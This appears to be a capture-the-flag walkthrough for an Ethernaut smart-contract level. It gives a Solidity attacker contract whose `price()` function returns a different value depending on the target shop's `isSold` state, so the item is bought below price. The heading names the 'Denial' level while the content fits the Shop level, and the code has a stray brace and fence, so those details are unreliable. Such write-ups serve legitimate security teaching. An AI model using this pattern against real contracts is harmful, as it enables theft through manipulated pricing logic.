# Ethernaut Level 22 (Denial) Walkthrough

The following is a semantic solution walkthrough of the Ethernaut CTF level 22. The aim is to give a readable explanation of the concepts involved, and present a step-by-step walkthrough of the solution. In addition, tangential explanations will also be given where essential.

The lesson here is to be careful when writing logic depending on external contract functions.

#### Solution

The solution is simply to write a `Buyer` contract and implement the `price` and `buy` functions. Inside `price`, whose return value the target contract depends on, we can write our own malicious implementation that reads the target contract's `isSold` variable and changes return value based on that. Another way could be to rely on changes in gas value and change the return value mid- execution. I went with the former approach.

interface IBuyer {
  function price() external view returns (uint);
}

interface IShop {
  function buy() external;
  function isSold() external view returns (bool);
}

contract Buyer {
  IShop shop;
  constructor() public {
    shop = IShop(0x2bC579a23E7187C3025EaFe26E8909273eda880f);
  }

  function price() external view returns (uint) {
    return !shop.isSold() ? 101 : 1;
  }

  function buy() public {
    shop.buy();
  }
  }
```
